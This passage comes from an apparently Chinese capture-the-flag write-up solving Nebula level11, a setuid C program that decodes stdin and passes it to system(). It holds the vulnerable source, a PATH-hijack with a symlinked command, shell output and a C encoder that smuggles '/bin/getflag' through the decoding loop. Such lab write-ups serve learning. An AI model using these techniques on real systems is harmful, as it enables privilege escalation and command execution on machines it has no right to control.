  &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_CREAT&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;O_RDWR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;0600&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;unlink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;#define CL &amp;quot;Content-Length: &amp;quot;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;errx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;reading from stdin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;errx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;invalid header&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fread length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getrand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;blue = %d, length = %d, &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="n"&gt;pink&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pink = %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pink&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fread fail(blue = %d, length = %d)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;  

    &lt;span class="n"&gt;mem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PROT_READ&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;PROT_WRITE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAP_PRIVATE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MAP_FAILED&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;mmap&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这题是整个Nebula中最纠结的一题之一，最主要原因是因为代码和二进制程序不符……我查阅了Google中前几页基本所有的Nebula level11的解题思路，发现能作出结果的代码都是Nebula的新LiveCD之前的。所以这里，我们先回到原本的程序。先将上面的代码用root编译，命名成flag11_old，并修改文件权限、所有者、所有组等和flag11一致，然后开始下面的步骤。&lt;/p&gt;
&lt;p&gt;首先映入眼帘的是比前面一次更长的代码-_-||| 不过好在代码逻辑还是比较清晰的。这里既然要执行shell，就会定位到&lt;code&gt;system()&lt;/code&gt;，而这样就必须要调用&lt;code&gt;process()&lt;/code&gt;。可以看到调用发生在&lt;code&gt;main()&lt;/code&gt;的第三个if中。所谓的两种方法可能是指走不同的逻辑去执行&lt;code&gt;process()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;观察一下走if为true的这条线：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fread length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第一个条件&lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;很简单，可是，&lt;code&gt;fread()&lt;/code&gt;只会返回0或1，也就是说我们要执行的指令只能是1个字节的。但回车也会占用1个字节，我们可以做个试验：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: &lt;span class="m"&gt;1&lt;/span&gt;

sh: &lt;span class="s1"&gt;$&amp;#39;\v\020\367&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
level11@nebula:/home/flag11$ ./flag11_old
Content-Length: &lt;span class="m"&gt;1&lt;/span&gt;

sh: &lt;span class="s1"&gt;$&amp;#39;\vP\241&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到，这样对于获取到了buf的内容完全是随机的。如果我们输入一个单字符命令，比如&lt;code&gt;X&lt;/code&gt;，根据&lt;code&gt;process()&lt;/code&gt;中的代码，命令&lt;code&gt;X&lt;/code&gt;会变为&lt;code&gt;Y&lt;/code&gt;，之后进入&lt;code&gt;system()&lt;/code&gt;执行。测试一下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: &lt;span class="m"&gt;1&lt;/span&gt;
X
sh: &lt;span class="s1"&gt;$&amp;#39;Y\020\321&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到&lt;code&gt;X&lt;/code&gt;命令被当做&lt;code&gt;Y&lt;/code&gt;命令执行，但由于已经占用了一个字符，则没有办法输入回车。这里可以用一个拼运气的办法，不断测试，直到碰到内存中有0x0A（回车）从而获得运行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level11@nebula:/tmp$ ln -s /bin/getflag Y
level11@nebula:/tmp$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
level11@nebula:/tmp$ &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;Content-Length: 1\nX&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /home/flag11/flag11_old
sh: &lt;span class="s1"&gt;$&amp;#39;Y\240S&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
level11@nebula:/tmp$ &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;Content-Length: 1\nX&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /home/flag11/flag11_old
sh: &lt;span class="s1"&gt;$&amp;#39;Y\340d&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
level11@nebula:/tmp$ &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;Content-Length: 1\nX&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /home/flag11/flag11_old
sh: &lt;span class="s1"&gt;$&amp;#39;Y\200b&amp;#39;&lt;/span&gt;: &lt;span class="nb"&gt;command&lt;/span&gt; not found
level11@nebula:/tmp$ &lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="s2"&gt;&amp;quot;Content-Length: 1\nX&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /home/flag11/flag11_old
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运气不错，没试几次就得到了结果:D&lt;/p&gt;
&lt;p&gt;第二种方法就是走if的另外一条路，那需要满足&lt;code&gt;length &amp;gt;= sizeof(buf)&lt;/code&gt;，也就是Length&amp;gt;=1024。可以先创建一个1024长度的空内容，之后把需要执行的命令填充进去：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/getflag&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Content-Length: 1024&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;根据&lt;code&gt;getrand()&lt;/code&gt;中的要求，设置一下环境变量：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;TEMP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp
